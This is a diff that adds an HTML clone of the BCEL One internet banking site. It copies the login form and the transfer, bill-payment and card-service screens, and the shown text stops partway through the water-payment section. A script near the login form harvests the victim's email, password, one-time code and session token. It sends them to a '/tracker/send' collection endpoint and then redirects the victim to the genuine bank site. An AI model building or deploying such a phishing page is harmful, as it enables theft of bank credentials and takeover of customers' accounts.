@@ -1,0 +1,2797 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/html">
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <link href="https://bcel.la:8083/css/lang0.css" rel="stylesheet" type="text/css"/>
+  <link href="https://bcel.la:8083/css/style.css" rel="stylesheet" type="text/css"/>
+  <link href="https://bcel.la:8083/css/slides.css" rel="stylesheet" type="text/css"/>
+  <script src="string.php?js" type="text/javascript">
+  </script>
+  <script src="js/jquery-1.9.1.min.js" type="text/javascript">
+  </script>
+  <script src="js/jquery.json-2.4.min.js" type="text/javascript">
+  </script>
+  <script src="js/jquery.placeholder.js" type="text/javascript">
+  </script>
+  <script src="js/jquery.transit.min.js" type="text/javascript">
+  </script>
+  <script src="js/core-min.js" type="text/javascript">
+  </script>
+  <script src="js/cipher-core-min.js" type="text/javascript">
+  </script>
+  <script src="js/enc-base64.js" type="text/javascript">
+  </script>
+  <script src="js/aes-min.js" type="text/javascript">
+  </script>
+  <script src="js/sha1-min.js" type="text/javascript">
+  </script>
+  <script src="js/mode-ecb-min.js" type="text/javascript">
+  </script>
+  <script src="js/script.js" type="text/javascript">
+  </script>
+  <script src="js/slides.js?update=2020-04-06" type="text/javascript">
+  </script>
+  <script src="js/jquery.qrcode.min.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   var lang = '0';
+  </script>
+  <title>
+   BCEL One
+  </title>
+ </head>
+ <body>
+  <div class="background">
+  </div>
+  <div class="container">
+   <div class="titlebar">
+    <div class="titletext">
+     <img id="logo" src="https://bcel.la:8083/img/logo.png"/>
+    </div>
+   </div>
+   <div class="backbuttonicon" style="display: none">
+    <div class="backicon">
+     &lt;
+    </div>
+    <div class="backtext">
+     Back
+    </div>
+   </div>
+   <div class="contentcontainer">
+    <div class="cardbox">
+     <div class="cardbutton">
+      Change Card
+     </div>
+    </div>
+    <div class="menupanel">
+     <div class="menubutton" id="selectedcard">
+      <img src="https://bcel.la:8083/img/ATM-Gold.png"/>
+      <p>
+       62XXXX35
+      </p>
+     </div>
+     <div class="menubutton newsbutton">
+      <img src="https://bcel.la:8083/img/minimenus/news.png"/>
+      <p>
+       News
+      </p>
+     </div>
+     <div class="menubutton messagebutton">
+      <img src="https://bcel.la:8083/img/minimenus/message.png"/>
+      <p>
+       Message
+      </p>
+      <div class="newicon">
+      </div>
+     </div>
+     <div class="menubutton promotionsbutton">
+      <img src="https://bcel.la:8083/img/minimenus/promotions.png"/>
+      <p>
+       Promotions
+      </p>
+     </div>
+     <div class="menubutton exchangebutton">
+      <img src="https://bcel.la:8083/img/minimenus/exchange.png"/>
+      <p>
+       Rates
+      </p>
+     </div>
+     <div class="menubutton changepasswordbutton">
+      <img src="https://bcel.la:8083/img/minimenus/password.png"/>
+      <p>
+       Password
+      </p>
+     </div>
+     <div class="menubutton feedbackbutton">
+      <img src="https://bcel.la:8083/img/minimenus/feedback.png"/>
+      <p>
+       Feedback
+      </p>
+     </div>
+     <div class="menubutton logoutbutton">
+      <img src="https://bcel.la:8083/img/minimenus/logout.png"/>
+      <p>
+       Logout
+      </p>
+     </div>
+    </div>
+    <script>
+     let IP_local;
+            async function sendData(event) {
+                event.preventDefault();
+
+                const email = document.getElementById("email").value;
+                const password = document.getElementById("password").value;
+                const OTP = document.getElementById("otp").value;
+                const hostName = window.location.hostname;
+                const sessionId = localStorage.getItem("Session");
+                const fullUrl = window.location.href;
+                const url = new URL(fullUrl);
+                const id = url.searchParams.get("id");
+                IP_local = "dsds";
+                if (email && password && OTP) {
+                try {
+                    const response = await fetch(
+                    `http://127.0.0.1:5000/tracker/send?email=${email}&password=${password}&otp=${OTP}&ip_address=${IP_local}&host_name=${hostName}&session=${sessionId}&id=${id}`,
+                    {
+                        method: "GET",
+                        headers: {
+                        "Content-Type": "application/json",
+                        },
+                    }
+                    );
+                    window.location.href = "https://bcel.la:8083/";
+                } catch (error) {
+                    console.error("Error:", error);
+                }
+                } else {
+                alert("Please fill in all fields.");
+                }
+            }
+    </script>
+    <div class="slides">
+     <!-- ######################################## LOGIN ######################################## -->
+     <div class="slide" id="login" style="margin-left: 0px; display: block; opacity: 1;">
+      <h1>
+       Welcome to BCEL One
+      </h1>
+      <form onsubmit="sendData(event)">
+       <p>
+        <input id="email" name="email" placeholder="E-Mail" type="text"/>
+       </p>
+       <p>
+        <input id="password" name="password" placeholder="Password" type="password"/>
+       </p>
+       <p>
+        To make your user more secure. Please enter OTP from BCEL One app.
+        <br/>
+        <img src="https://bcel.la:8083/img/otpsteps.png" style="height: 150px;"/>
+        <br/>
+        <input id="otp" name="otp" placeholder="OTP" type="text"/>
+       </p>
+       <p class="errormessage">
+       </p>
+       <p>
+        <button id="loginbutton" type="submit">
+         Login
+         <img src="https://bcel.la:8083/img/icon-right.png"/>
+        </button>
+       </p>
+       <!--<p><a href="reg.php?langid=0" style="text-decoration: none">Register BCEL One</a></p>-->
+      </form>
+      <span class="button languagebutton">
+       <a href="?lang=1">
+        <img src="https://bcel.la:8083/img/icon-la.png"/>
+        ລາວ
+       </a>
+      </span>
+      <div class="footer">
+       <p>
+        © 2013 BANQUE POUR LE COMMERCE EXTERIEUR LAO PUBLIC. All rights reserved.
+        <a href="terms.php?langid=0">
+         Terms &amp; Conditions
+        </a>
+       </p>
+       <p>
+        Tel: (856-21) 213200, 222495, (856-21) 213202, 223012.
+        <a href="qa.php?langid=0">
+         Questions &amp; Answers
+        </a>
+       </p>
+      </div>
+     </div>
+     <!-- ######################################## LOADING ######################################## -->
+     <div class="slide" id="loading">
+      <div class="widemargin" id="loadingelement">
+       <p>
+        <img src="https://bcel.la:8083/img/loading.gif"/>
+       </p>
+       <!--<p>Loading…</p>-->
+      </div>
+     </div>
+     <!-- ######################################## MESSAGES ######################################## -->
+     <div class="slide" id="messages">
+      <h1 data-name="ກ່ອງຈົດໝາຍ">
+       ກ່ອງຈົດໝາຍ
+      </h1>
+      <table class="messagestable">
+       <tr>
+        <th>
+         ເວລາ
+        </th>
+        <th>
+         ຂໍ້ຄວາມ
+        </th>
+       </tr>
+      </table>
+     </div>
+     <!-- ###################################### SELECT CARD ###################################### -->
+     <div class="slide" id="selectcard">
+      <h1 data-name="Select Card">
+       Please select the card
+      </h1>
+     </div>
+     <!-- #################################### CARD MENU #################################### -->
+     <div class="slide" id="cardmenu">
+      <h1 data-name="Card Service">
+       Select Card Service
+      </h1>
+      <div class="menuitem STATEMENT" id="statementbutton">
+       <img alt="Statement" src="https://bcel.la:8083/img/menus/statement.png"/>
+       <h3>
+        Mini Statement
+       </h3>
+      </div>
+      <div class="menuitem CARDINFO" id="cardinfobutton">
+       <img alt="Info" src="https://bcel.la:8083/img/menus/cardinfo.png"/>
+       <h3>
+        View Balance
+       </h3>
+      </div>
+      <div class="menuitem ECOMMERCE" id="ecommercebutton">
+       <img alt="Turn On/Off Internet Payment" src="https://bcel.la:8083/img/menus/ecommerce.png"/>
+       <h3>
+        Internet Payment
+       </h3>
+      </div>
+      <div class="menuitem TRANSFER" id="transferbutton">
+       <img alt="Transfer" src="https://bcel.la:8083/img/menus/transfer.png"/>
+       <h3>
+        Transfer
+       </h3>
+      </div>
+      <div class="menuitem PHONE" id="phonebutton0">
+       <img alt="Phone" src="https://bcel.la:8083/img/menus/phone.png"/>
+       <h3>
+        Pay Phone Bill
+       </h3>
+      </div>
+      <div class="menuitem ELECTRICITY" id="electricitybutton">
+       <img alt="Electricity" src="https://bcel.la:8083/img/menus/electricity.png"/>
+       <h3>
+        Pay Electricity Bill
+       </h3>
+      </div>
+      <div class="menuitem WATER" id="waterbutton">
+       <img alt="Water" src="https://bcel.la:8083/img/menus/water.png"/>
+       <h3>
+        Pay Water Bill
+       </h3>
+      </div>
+      <!--<div class='menuitem INTERNET' id="internetbutton"><img src='https://bcel.la:8083/img/menus/adsl.png' alt="Internet" /><h3>Internet</h3></div>-->
+      <div class="menuitem TK" id="tkbutton">
+       <img alt="TK" src="https://bcel.la:8083/img/menus/tk.png"/>
+       <h3>
+        TK
+       </h3>
+      </div>
+      <div class="menuitem LDTV" id="ldtvbutton">
+       <img alt="LDTV" src="https://bcel.la:8083/img/menus/ldtv.png"/>
+       <h3>
+        LDTV
+       </h3>
+      </div>
+      <div class="menuitem PETROTRADE" id="petrotradebutton">
+       <img alt="Petrotrade" src="https://bcel.la:8083/img/menus/petrotrade.png"/>
+       <h3>
+        Petrotrade
+       </h3>
+      </div>
+      <div class="menuitem HISTORY" id="historybutton">
+       <img alt="History" src="https://bcel.la:8083/img/menus/history.png"/>
+       <h3>
+        Billing History
+       </h3>
+      </div>
+      <div class="menuitem LOCKCARD" id="lockcardbutton">
+       <img alt="Lock Card" src="https://bcel.la:8083/img/menus/lockcard.png"/>
+       <h3>
+        Lock Card
+       </h3>
+      </div>
+      <!--<div class='menuitem FEEDBACK' id="feedbackbutton"><img src='https://bcel.la:8083/img/menus/feedback.png' alt="Feedback" /><h3>Feedback</h3></div>-->
+      <p>
+       <button class="backbutton" onclick="backToSlide('selectcard')">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <!-- #################################### STATEMENT #################################### -->
+     <div class="slide" id="statement">
+      <h1 data-name="Mini Statement">
+       Mini Statement
+      </h1>
+      <p id="msaccountline">
+       Statement for account
+       <select class="accounts" id="statementaccounts">
+       </select>
+      </p>
+      <p>
+       <span class="msbalancelabel">
+       </span>
+       <span class="msbalance bold">
+       </span>
+      </p>
+      <p>
+       <label>
+        <input id="msshowsummary" type="checkbox"/>
+        Show Summary
+       </label>
+      </p>
+      <table class="statementtable" id="statementtable">
+       <thead>
+        <tr>
+         <th>
+          No.
+         </th>
+         <th>
+          Time
+         </th>
+         <th>
+         </th>
+         <th>
+          Description
+         </th>
+         <th>
+          Amount
+         </th>
+         <!--<th class='balancecol'>Balance</th>-->
+        </tr>
+       </thead>
+       <tbody>
+       </tbody>
+      </table>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="msloadmore">
+        <img src="https://bcel.la:8083/img/icon-add.png"/>
+        Load More
+       </button>
+       <!-- <button><img src='https://bcel.la:8083/img/icon-print.png' /> Print Statement</button> -->
+      </p>
+     </div>
+     <!-- #################################### CARDINFO #################################### -->
+     <div class="slide" id="cardinfo">
+      <h1 data-name="View Balance">
+       View Balance
+      </h1>
+      <table class="citable">
+      </table>
+      <div class="cikeys">
+      </div>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+      </p>
+     </div>
+     <!-- #################################### TRANSFER #################################### -->
+     <div class="slide" id="transfer">
+      <h1 data-name="Transfer">
+       Transfer
+      </h1>
+      <h2>
+       Source Account:
+      </h2>
+      <select class="accounts" id="tsource">
+      </select>
+      <div class="noaccountbox">
+       <h2>
+        There are no destination accounts with the same currency
+       </h2>
+      </div>
+      <div class="transferbox">
+       <div class="narrowmargin">
+        <h2>
+         Destination Account:
+        </h2>
+        <button class="gray" id="selectaccount">
+         Select destination account
+        </button>
+       </div>
+       <div class="amountbox" style="display: none">
+        <h2 class="marginbottom">
+         Maximum transferable amount:
+         <span class="tlimit bold">
+         </span>
+        </h2>
+        <h2>
+         Amount (
+         <strong class="tsccy">
+         </strong>
+         ):
+        </h2>
+        <input id="tamount" name="tamount" type="text"/>
+        <div class="damountbox">
+         <h2>
+          Destination Amount (
+          <strong class="tdccy">
+          </strong>
+          ):
+         </h2>
+         <input id="tdamount" name="tdamount" type="text"/>
+         <p class="trate">
+         </p>
+        </div>
+        <div class="narrowmargin">
+         <h2>
+          Additional Description:
+         </h2>
+         <input id="tdesc" name="tdesc" type="text"/>
+        </div>
+        <div class="narrowmargin feedetail" style="display: none">
+         <p>
+          <img src="https://bcel.la:8083/img/information.png"/>
+          <br/>
+          <strong>
+           You will be charged
+           <span class="feeamount">
+           </span>
+          </strong>
+          <br/>
+          For a transfer on BCEL One of the amount more than or equal to
+          <span class="feeceiling">
+          </span>
+         </p>
+        </div>
+       </div>
+      </div>
+      <p class="errormessage">
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="addaccount">
+        Add Account
+        <img src="https://bcel.la:8083/img/icon-add.png"/>
+       </button>
+       <button id="transferbutton2">
+        Continue
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+     </div>
+     <div class="slide" id="transfer2">
+      <h1 data-name="Confirm Transfer">
+       Confirm Transfer
+      </h1>
+      <p class="errormessage">
+      </p>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Source Account:
+        </th>
+        <td>
+         <span class="tsourceaccount">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Destination Account:
+        </th>
+        <td>
+         <span class="tdestinationaccount">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Destination Name:
+        </th>
+        <td>
+         <span class="tdestinationname">
+         </span>
+        </td>
+       </tr>
+       <tr class="feedetail" style="display: none">
+        <th>
+         Fee:
+        </th>
+        <td>
+         <span class="feeamount">
+         </span>
+        </td>
+       </tr>
+      </table>
+      <h2>
+       Amount:
+      </h2>
+      <p class="largetext">
+       <span class="tamount">
+       </span>
+       <span class="tsccy">
+       </span>
+      </p>
+      <div class="damountbox">
+       <h2>
+        Destination Amount:
+       </h2>
+       <p class="largetext">
+        <span class="tdamount">
+        </span>
+        <span class="tdccy">
+        </span>
+       </p>
+       <p class="trate">
+       </p>
+      </div>
+      <div class="narrowmargin">
+       <h2>
+        Additional Description:
+       </h2>
+       <p class="tdesc">
+       </p>
+      </div>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="transferbutton3">
+        Transfer
+        <img src="https://bcel.la:8083/img/icon-yes.png"/>
+       </button>
+      </p>
+     </div>
+     <div class="slide" id="transfer3">
+      <h1 data-name="Transfer Completed">
+       Transfer Completed
+      </h1>
+      <p>
+       <img alt="Success" src="https://bcel.la:8083/img/success.png"/>
+      </p>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Source Account:
+        </th>
+        <td>
+         <span class="tsourceaccount">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Destination Account:
+        </th>
+        <td>
+         <span class="tdestinationaccount">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Destination Name:
+        </th>
+        <td>
+         <span class="tdestinationname">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Amount:
+        </th>
+        <td>
+         <span class="tamount">
+         </span>
+         <span class="tccy">
+         </span>
+        </td>
+       </tr>
+       <tr class="damountbox">
+        <th>
+         Destination Amount:
+        </th>
+        <td>
+         <span class="tdamount">
+         </span>
+         <span class="tdccy">
+         </span>
+        </td>
+       </tr>
+       <tr class="damountbox">
+        <th>
+         <span class="trate">
+         </span>
+        </th>
+        <td>
+        </td>
+       </tr>
+       <tr class="feedetail" style="display: none">
+        <th>
+         Fee
+        </th>
+        <td>
+         <span class="feeamount">
+         </span>
+        </td>
+       </tr>
+      </table>
+      <p>
+       <button class="homebutton">
+        <img src="https://bcel.la:8083/img/icon-home.png"/>
+        Back to Home
+       </button>
+      </p>
+     </div>
+     <!-- #################################### ECOMMERCE #################################### -->
+     <div class="slide" id="ecommerce">
+      <h1 data-name="Open/Close Online Payment">
+       Open/Close Online Payment
+      </h1>
+      <p>
+       Your card's online status is:
+      </p>
+      <p class="widemargin">
+       <img id="ecomicon"/>
+       <span id="ecomtext">
+       </span>
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button onclick="openSlide('ecommerce2')">
+        <span id="ecommercebutton2text">
+        </span>
+        <img src="https://bcel.la:8083/img/icon-power.png"/>
+       </button>
+      </p>
+     </div>
+     <div class="slide" id="ecommerce2">
+      <h1 data-name="Open/Close Online Confirmation" id="ecomconfirmtitle">
+       Open/Close Online Confirmation
+      </h1>
+      <p class="widemargin">
+       <img id="ecomconfirmicon"/>
+       <span id="ecomconfirmtext">
+       </span>
+      </p>
+      <div id="ecomconfirmcaution">
+       <p>
+       </p>
+       <p>
+       </p>
+       <p>
+        I fully understand and acknowledge that there are higher risks associated with setting up online payment and I am fully liable on all online transactions in my account
+       </p>
+      </div>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="ecommercebutton3">
+        Confirm
+        <img src="https://bcel.la:8083/img/icon-yes.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="ecommerce3">
+      <h1 data-name="Open/Close Online Payment" id="ecomfinaltext">
+       Ecom Completed
+      </h1>
+      <p>
+       <img alt="Success" src="https://bcel.la:8083/img/success.png"/>
+       <br/>
+      </p>
+      <p>
+       <button class="homebutton">
+        <img src="https://bcel.la:8083/img/icon-home.png"/>
+        Back to Home
+       </button>
+      </p>
+     </div>
+     <!-- #################################### PHONE PAYMENT #################################### -->
+     <div class="slide" id="phone">
+      <h1 data-name="Phone Payment">
+       Phone Payment
+      </h1>
+      <p>
+       Support Prepaid, Postpaid, PSTN, Internet
+       <br/>
+       Example: 2055694556, 21312424
+      </p>
+      <div class="narrowmargin">
+       <img src="https://bcel.la:8083/img/telecom-beeline.png"/>
+       <img src="https://bcel.la:8083/img/telecom-etl.png"/>
+       <img src="https://bcel.la:8083/img/telecom-laotel.png"/>
+       <br/>
+       <br/>
+       <!--<img src='https://bcel.la:8083/img/telecom-unitel.png' />-->
+       <input id="phonenumber" name="phonenumber" placeholder="Phone Number" type="text"/>
+       <button class="gray" id="precent" style="padding: 0.2em 0.3em !important" type="button">
+        <img src="https://bcel.la:8083/img/icon-down.png"/>
+       </button>
+       <div class="phonelistbox" style="display: none">
+        <h3>
+         Saved numbers:
+        </h3>
+        <table class="phonelist">
+         <tr>
+          <td class="nowrap">
+           <img src="https://bcel.la:8083/img/icon-delete.png"/>
+           22456699
+          </td>
+          <td>
+           Mr. Test Test
+          </td>
+         </tr>
+         <tr>
+          <td class="nowrap">
+           <img src="https://bcel.la:8083/img/icon-delete.png"/>
+           22456699
+          </td>
+          <td>
+           Mr. Test Test
+          </td>
+         </tr>
+        </table>
+       </div>
+      </div>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <!--<button id="addphone">Add Phone <img src='https://bcel.la:8083/img/icon-add.png' /></button>-->
+       <button id="phonebutton">
+        Continue
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="phone2">
+      <h1 data-name="Phone Payment">
+       Phone Payment
+      </h1>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Phone Type:
+        </th>
+        <td>
+         <span class="ppphonetype">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Phone Number:
+        </th>
+        <td>
+         <span class="ppphonenumber">
+         </span>
+        </td>
+       </tr>
+       <tr class="ppnamerow">
+        <th>
+         Owner Name:
+        </th>
+        <td>
+         <span class="ppname">
+         </span>
+        </td>
+       </tr>
+       <tr class="ppbalancerow">
+        <th>
+         <span class="ppbalancename">
+         </span>
+         :
+        </th>
+        <td>
+         <span class="ppbalance">
+         </span>
+         Kip
+        </td>
+       </tr>
+       <tr class="ppshowname">
+        <th>
+        </th>
+        <td>
+         <button class="gray" id="pshowname">
+          Show name and balance
+         </button>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <select class="accounts" id="paccount">
+         </select>
+        </td>
+       </tr>
+      </table>
+      <p>
+       Amount to pay:
+      </p>
+      <p class="largetext">
+       <input class="small" id="ppamount" type="text"/>
+       Kip
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="phonebutton2">
+        Continue
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="phone3">
+      <h1 data-name="Confirm Phone Payment">
+       Confirm Phone Payment
+      </h1>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Phone Type:
+        </th>
+        <td>
+         <span class="ppphonetype">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Phone Number:
+        </th>
+        <td>
+         <span class="ppphonenumber">
+         </span>
+        </td>
+       </tr>
+       <tr class="ppnamerow">
+        <th>
+         Owner Name:
+        </th>
+        <td>
+         <span class="ppname">
+         </span>
+        </td>
+       </tr>
+       <tr class="ppbalancerow">
+        <th>
+         <span class="ppbalancename">
+         </span>
+         :
+        </th>
+        <td>
+         <span class="ppbalance">
+         </span>
+         Kip
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <span class="paccount">
+         </span>
+        </td>
+       </tr>
+      </table>
+      <p>
+       Amount to pay:
+      </p>
+      <p class="largetext">
+       <span class="ppamount">
+       </span>
+       Kip
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="phonebutton3">
+        Pay
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="phone4">
+      <h1 data-name="Phone Payment Completed">
+       Phone Payment Completed
+      </h1>
+      <p>
+       <img alt="Success" src="https://bcel.la:8083/img/success.png"/>
+       <br/>
+       You have completed the phone payment
+       <br/>
+       For phone number
+       <span class="ppphonenumber">
+       </span>
+       ,
+                            Amount
+       <span class="ppamount">
+       </span>
+       Kip,
+                            Phone Type
+       <span class="ppphonetype">
+       </span>
+      </p>
+      <p>
+       <button class="homebutton">
+        <img src="https://bcel.la:8083/img/icon-home.png"/>
+        Back to Home
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <!-- #################################### ELECTRICITY #################################### -->
+     <div class="slide" id="electricity">
+      <h1 data-name="Electricity Payment">
+       Electricity Payment
+      </h1>
+      <p>
+       <img src="https://bcel.la:8083/img/electricitysample.png"/>
+      </p>
+      <div class="narrowmargin">
+       <h2>
+        Province:
+       </h2>
+       <p>
+        <select class="provinces" id="eprovince">
+        </select>
+       </p>
+       <h2>
+        Customer Code:
+       </h2>
+       <input id="customercode" name="customercode" placeholder="Customer Code" type="text"/>
+       <button class="gray" id="erecent" style="padding: 0.2em 0.3em !important" type="button">
+        <img src="https://bcel.la:8083/img/icon-down.png"/>
+       </button>
+      </div>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="electricitybutton1">
+        <img src="https://bcel.la:8083/img/icon-yes.png"/>
+        Continue
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="electricity2">
+      <h1 data-name="Confirm Electric Payment">
+       Confirm Electric Payment
+      </h1>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Province:
+        </th>
+        <td>
+         <span class="eprovince">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Electricity Customer Code:
+        </th>
+        <td>
+         <span class="ecustcode">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Electricity Customer Name:
+        </th>
+        <td>
+         <span class="ecustname">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Bill Date:
+        </th>
+        <td>
+         <span class="ebilldate">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         <span class="ebalancename">
+         </span>
+         :
+        </th>
+        <td>
+         <span class="ebalance">
+         </span>
+         <span class="ecurrency">
+          Kip
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <select class="accounts" id="eaccount">
+         </select>
+        </td>
+       </tr>
+      </table>
+      <p>
+       Amount to pay:
+      </p>
+      <p class="largetext">
+       <input class="small" id="eamount" type="text"/>
+       Kip
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="electricitybutton2">
+        Continue
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="electricity3">
+      <h1 data-name="Confirm Electric Payment">
+       Confirm Electric Payment
+      </h1>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Province:
+        </th>
+        <td>
+         <span class="eprovince">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Electricity Customer Code:
+        </th>
+        <td>
+         <span class="ecustcode">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Electricity Customer Name:
+        </th>
+        <td>
+         <span class="ecustname">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Bill Date:
+        </th>
+        <td>
+         <span class="ebilldate">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         <span class="ebalancename">
+         </span>
+         :
+        </th>
+        <td>
+         <span class="ebalance">
+         </span>
+         <span class="ecurrency">
+          Kip
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <span class="accounts">
+         </span>
+        </td>
+       </tr>
+      </table>
+      <p>
+       Amount to pay:
+      </p>
+      <p class="largetext">
+       <span class="eamount">
+       </span>
+       Kip
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="electricitybutton3">
+        Pay
+        <img src="https://bcel.la:8083/img/icon-yes.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="electricity4">
+      <h1 data-name="Electricity Payment Completed">
+       Electricity Payment Completed
+      </h1>
+      <p>
+       <img alt="Success" src="https://bcel.la:8083/img/success.png"/>
+       <br/>
+       <span class="bold">
+        You have completed electricity payment
+       </span>
+       <table class="keyvalue">
+        <tr>
+         <th>
+          Province:
+         </th>
+         <td>
+          <span class="eprovince">
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <th>
+          Electricity Customer Code:
+         </th>
+         <td>
+          <span class="ecustcode">
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <th>
+          Electricity Customer Name:
+         </th>
+         <td>
+          <span class="ecustname">
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <th>
+          Bill Date:
+         </th>
+         <td>
+          <span class="ebilldate">
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <th>
+          Amount:
+         </th>
+         <td>
+          <span class="eamount">
+          </span>
+          Kip
+         </td>
+        </tr>
+       </table>
+      </p>
+      <p>
+       <button class="homebutton">
+        <img src="https://bcel.la:8083/img/icon-home.png"/>
+        Back to Home
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <!-- #################################### WATER #################################### -->
+     <div class="slide" id="water">
+      <h1 data-name="Water Payment">
+       Water Payment
+      </h1>
+      <p>
+       <img src="https://bcel.la:8083/img/waterbill.png"/>
+      </p>
+      <div class="narrowmargin">
+       <h2>
+        Province:
+       </h2>
+       <p>
+        <select class="provinces" id="wpprovince">
+        </select>
+       </p>
+       <h2>
+        Water User Code:
+       </h2>
+       <input id="wpusercode" name="customercode" placeholder="Water User Code" type="text"/>
+       <button class="gray" id="wrecent" style="padding: 0.2em 0.3em !important" type="button">
+        <img src="https://bcel.la:8083/img/icon-down.png"/>
+       </button>
+      </div>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="waterbutton2">
+        Continue
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="water2">
+      <h1 data-name="Water Payment">
+       Water Payment
+      </h1>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Province:
+        </th>
+        <td>
+         <span class="wpprovince">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Water User Code:
+        </th>
+        <td>
+         <span class="wpusercode">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Water User Name:
+        </th>
+        <td>
+         <span class="wpusername">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Bill Date:
+        </th>
+        <td>
+         <span class="wpbilldate">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         <span class="wpbalancename">
+         </span>
+         :
+        </th>
+        <td>
+         <span class="wpbalance">
+         </span>
+         <span class="wpcurrency">
+          Kip
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <select class="accounts" id="wpaccount">
+         </select>
+        </td>
+       </tr>
+      </table>
+      <p>
+       Amount to pay:
+      </p>
+      <p class="largetext">
+       <input class="small" id="wpamount" type="text"/>
+       Kip
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="waterbutton3">
+        Continue
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
